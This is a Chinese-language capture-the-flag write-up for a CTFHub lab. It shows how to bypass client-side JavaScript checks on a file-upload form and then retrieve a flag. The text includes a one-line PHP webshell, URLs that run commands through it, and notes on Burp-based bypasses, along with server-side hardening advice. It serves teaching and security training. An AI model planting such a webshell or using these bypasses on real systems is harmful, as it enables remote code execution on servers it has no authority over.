CTFHub 文件上传 - js前端验证

2026年9月21日 CTFHub Web安全 文件上传 前端绕过

一、题目信息

  • 题目名称：文件上传 - js前端验证
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / 文件上传漏洞 / 客户端验证绕过
  • 靶场链接：http://challenge-96ff915f278fdb68.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、开发者工具（F12）、Base64在线解码工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是客户端（前端）JavaScript 验证的不可信性。题目在“无限制”的基础上增加了前端 JS 校验，试图限制用户只能上传图片。但攻击者可以完全控制自己的浏览器，或者通过抓包修改 HTTP 请求，从而轻易绕过前端验证。后端如果没有二次校验，依然存在 RCE（远程代码执行）漏洞。

2. 怎么想（破题思路）

  • 尝试上传包含 PHP 代码的 shell.php 文件，发现被浏览器弹窗拦截，提示只允许上传图片格式。
  • 明确这是前端 JS 验证。由于 JS 代码运行在本地浏览器，攻击者拥有绝对控制权，因此这种验证形同虚设。
  • 思路：使用浏览器的开发者工具禁用 JavaScript，直接切断前端校验逻辑。
  • 上传成功后，由于后端没有校验，恶意文件依然会被保存，从而获得 WebShell。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：误以为需要在 Chrome 全局设置中关闭 JS

踩坑情况：在浏览器设置（Settings）的“隐私与安全”中寻找关闭 JavaScript 的选项，发现只能调整 V8 引擎的“优化”行为，无法直接禁用 JS。

原因分析：Chrome 全局禁用 JS 的入口很深，且会影响所有网页，不适合当前调试场景。

改进方式：直接在当前靶机页面按 F12 打开开发者工具。点击右上角齿轮（Settings），在左侧选择 Preferences，向下滚动找到 Debugger 选项卡，勾选 Disable JavaScript。这样可以仅针对当前标签页禁用 JS，刷新页面后前端验证代码就不会执行了。

详细实操步骤

第一步：构造木马文件

在本地新建 shell.php，写入以下代码：

<?php system($_GET['cmd']); ?>

代码逐字深度解析：

  • <?php：PHP 脚本的起始标记，告诉 Web 服务器从这里开始按 PHP 代码解析。
  • system：PHP 的内置函数，用于执行外部系统命令，并直接输出执行结果。
  • ( )：函数参数括号，里面的内容会作为命令传给 system 执行。
  • $_GET：PHP 超全局变量，用于接收 HTTP GET 请求中 URL 参数的数据。
  • [ 'cmd' ]：数组下标。表示提取 URL 中名为 cmd 的参数值。例如 URL 为 ?cmd=ls，则 $_GET['cmd'] 的值就是 ls。
  • ;：PHP 语句结束符。
  • ?>：PHP 脚本的结束标记。

第二步：禁用前端 JS 并上传

按上述方法在 F12 中勾选 Disable JavaScript。不要关闭开发者工具，选择 shell.php 并点击 Submit。此时无弹窗，页面返回：上传文件相对路径：upload/shell.php（注意是单数 upload）。

第三步：寻找 Flag 文件

在浏览器访问：http://.../upload/shell.php?cmd=ls ../

页面回显发现可疑文件：flag_1533718635.php。

第四步：Base64 读取并解码

直接访问 .../upload/shell.php?cmd=cat ../flag_1533718635.php 会返回空白页。原因分析：Flag 文件的内容是 <?php // ctfhub{xxxx} ?>，PHP 解析器会执行 <?php 和 ?> 之间的代码，// 后面的内容被当作注释，不会输出到浏览器。

因此改用 Base64 命令读取：

http://.../upload/shell.php?cmd=base64 ../flag_1533718635.php

页面回显 Base64 字符串（如 PD9waHAgLy8gY3RmaHVi...）。复制该字符串，在在线 Base64 解码网站解码，得到 Flag：ctfhub{657ba8105753d69748a373df}。

4. 怎么迁移（跨领域联想）

  • 渗透测试实战：在真实渗透中，遇到前端限制（如长度限制、格式限制），攻击者往往通过 Burp Suite 开启抓包拦截。在请求包发往服务器之前，将文件名从 shell.php.jpg 修改为 shell.php，或者修改 MIME 类型等，完成绕过。
  • 安全开发（SDL）：开发者必须明确“任何来自客户端的数据都是不可信的”。所有验证逻辑必须在服务端（如 PHP 的 move_uploaded_file 之前）进行二次验证，绝不能依赖前端的 JS 验证。
  • 逆向工程与调试：利用 F12 修改网页元素（如双击修改 DOM 属性）、禁用 JavaScript、修改断点，是前端调试和逆向分析的基础技能。这些技能在爬虫对抗、JS 逆向上也有广泛应用。

三、名词大全与原理深度复盘

1. 客户端（前端）验证 vs 服务端（后端）验证

客户端验证是运行在用户浏览器中的 JavaScript 代码，它的优势是响应快，能减轻服务器压力；缺点是代码完全暴露且可被用户轻易篡改。服务端验证是运行在 Web 服务器上的代码，用户无法直接修改，是安全验证的唯一屏障。B/S 架构中，安全边界应当划在服务端。

2. Base64 编码的本质

Base64 是一种基于 64 个可打印字符来表示二进制数据的编码方式。它常用于在 HTTP 环境下传输二进制数据（如邮件附件、图片）。在本题中，base64 命令将包含 PHP 标签的文件转化为无意义的文本，阻止了 Web 服务器的 PHP 解析器去处理它。这也是 CTF 中绕过 PHP 代码解析输出数据的常用技巧。

3. 漏洞成因底层逻辑复盘

造成本题漏洞的根本原因，是开发者对“边界”的认知错误。开发者认为加上了前端 JS 检查，文件就无法被篡改，从而在后端省略了校验逻辑。但在 HTTP 协议中，客户端和服务器之间的数据包是可以被代理拦截和任意修改的。攻击者只需要绕过前端防线，就可以向服务器发送任何恶意数据。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与“无限制”的区别：“无限制”是彻底不设防；“js前端验证”则是在第一道门（浏览器）设置了障碍，但通过禁用 JS 或抓包可以轻松突破。
  • 与“MIME绕过”、“黑名单绕过”的区别：前端验证属于在用户侧拦截，绕过难度极低；而 MIME 和黑名单是服务端拦截，属于真正的服务端防御，通常需要构造特定的请求包或者寻找解析漏洞来绕过。
  • 与“文件包含漏洞”的区别：文件包含是服务器提供了一个“执行器”，去执行已有的恶意文件；文件上传是直接把恶意文件送进服务器。两者常组合使用，例如上传图片马，再通过文件包含漏洞去执行。

2. 这种题目的出现原因

这种漏洞在早期 Web 开发中非常普遍。开发人员为了提升用户体验，避免上传无意义的文件导致服务器报错，通常会先在前端用 JS 写一段验证代码。如果后端没有做好二次检查（或者后端只检查了 Content-Type，但 Content-Type 也是客户端可控的），这就形成了典型的“客户端不可信”漏洞。

3. 这种应用在实际中如何体现？

在真实应用中，如上传头像、上传附件等业务，攻击者常利用此漏洞上传 Webshell。企业需要部署 WAF（Web 应用防火墙）并在服务器端进行强制校验（后缀名白名单、文件头检测、二次渲染、重命名文件、设置文件目录无执行权限）。

4. 如何抽象理解概念（大白话理解）

把网站服务器比作一家酒吧：

  • 前端验证：是酒吧门口的保安（浏览器）。他看一眼你带的包，如果是刀（恶意文件），就不让你进。但你可以绕开大门，从窗口爬进去（禁用JS绕过），或者把刀藏在衣服里（抓包改包），甚至你把保安打晕（修改前端代码）直接进去。
  • 后端验证：是酒吧吧台里的安检门（服务器）。如果你只在门口（前端）设防，里面根本没安检，一旦你进去了，你带什么武器都没人管。
  • Base64读取：就像保险柜（PHP文件）里放了一张写着秘密的纸条，你直接看（cat）保险柜的玻璃被特殊涂层挡住了（PHP解析成空白），你干脆把保险柜整个搬回家里（下载原始数据），用家里的工具（Base64解码）打开看。

做一道题，就要往自己脑子里装点东西。
